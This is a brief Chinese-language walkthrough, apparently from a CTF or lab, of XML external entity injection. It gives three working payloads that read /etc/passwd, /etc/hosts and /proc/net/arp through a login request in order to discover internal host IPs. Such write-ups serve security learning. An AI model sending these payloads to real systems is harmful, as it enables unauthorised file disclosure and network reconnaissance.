/etc/hosts 储存域名解析的缓存

/etc/passwd 用户密码

/proc/net/arp 每个网络接口的arp表中dev包

  

先查看/etc/passwd

*   
*   
*   
*   
*   
*   
*   
*   

```
<?xml version="1.0" ?><!DOCTYPE note [<!ENTITY M1kael SYSTEM "file:///etc/passwd">]><user><username>&M1kael;</username><password>123456</password></user>
```

![](../Images/ab3f5aabf82a430e4dfa6bd89177ffe9.png)

没什么发现

再看看/etc/hosts

*   
*   
*   
*   
*   
*   
*   
*   

```
<?xml version="1.0" ?><!DOCTYPE note [<!ENTITY M1kael SYSTEM "file:///etc/hosts">]><user><username>&M1kael;</username><password>123456</password></user>
```

![](../Images/4c7a3d1cb973ace98a336feeb5edd2bc.png)

也没内网主机ip

再试试/proc/net/arp

*   
*   
*   
*   
*   
*   
*   
*   

```
<?xml version="1.0" ?><!DOCTYPE note [<!ENTITY M1kael SYSTEM "file:///proc/net/arp">]><user><username>&M1kael;</username><password>123456</password></user>
```

  

![](../Images/ab681fed944cbc2fedfab59da56fb607.png)

  

  

发现内网主机ip
